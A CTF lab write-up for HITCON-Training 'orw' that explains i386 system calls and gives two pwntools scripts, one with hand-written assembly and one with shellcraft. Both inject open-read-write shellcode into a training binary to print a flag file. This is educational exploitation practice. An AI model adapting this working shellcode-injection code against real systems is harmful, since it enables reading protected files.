# Lab2 orw

## 先備知識

### System call

system call function, eax, ebx, ecx, edx

![imgae](https://github.com/KJ-black/CTF-write-up/blob/main/HITCON-Training/jpg/row.png)

### prctl() process control

可以對process進行一些設置，可以限制process的系統調用

### .bss address

0804A040

### assembly code

[官方asm document](http://docs.pwntools.com/en/stable/asm.html)

- open

    ```wasm
    pop ebx ; ebx's value is filename, fd
    mov eax,5 ; open system call number
    mov ecx,0 ; flag
    int 0x80 ; after open finished, fd will return to eax
    ```

- read

    ```wasm
    mov ebx,eax ; fd
    mov ecx,esp ; put buffer in stack
    mov edx,0x60 ; size, we give it randomly
    mov eax,3 ; read system call number
    int 0x80 ; read will return the length
    ```

- write

    ```wasm
    mov edx, eax ; we put the length to edx
    mov ebx,1 ; stdout
    mov eax, 4
    int 0x80
    ```

- exit

    ```wasm
    mov eax,1
    int 0x80
    ```

## ORW (open read write)

調用system call的open read write取得flag

1. 先將打開該檔案open(filepath)
2. 讀取該檔案內容至內存
3. 利用write將內存用stdout輸出

## Solve

### solve 1 with asm

```python
from pwn import *

#r = remote("csie.ctf.tw", 10134)
r = process('./orw.bin')

sc = asm(
"""
    jmp hello
write:
	
	pop ebx 
	mov eax,5
	mov ecx,0 
	int 0x80 

	mov ebx,eax
	mov ecx,esp 
	mov edx,0x60
	mov eax,3 
	int 0x80
	
	mov edx, eax
	mov ebx,1
	mov eax, 4
	int 0x80
	
	mov eax,1
	int 0x80

hello:
    call write
    .ascii "/home/orw/flag"
    .byte 0
""", arch="i386")

r.recvuntil(":")
r.sendline(sc)
print r.recvall()
r.close()
# r.interactive()
```

## solve 2 with shellcraft (sc)

```python
#!/usr/bin/env python
#coding:utf-8

from pwn import *
from pwn import shellcraft as sc
context.log_level = "debug" # debug mode

shellcode = sc.pushstr("flag") # first push the filepath to the top of the stack
shellcode += sc.open("esp", 0, 0) # open the top of stack
shellcode += sc.read("eax", "esp", 0x100) # ( mov ebx,eax , mov ecx,exp , mov edx 0x100 )
shellcode += sc.write(1, "esp", 0x100) # ( mov ebx,1 , mov ecx,esp , mov, edx 0x100 )

io = process("./orw.bin")
#print(asm(shellcode))
io.sendlineafter("shellcode:", asm(shellcode))
print io.recvall()
io.close()
```
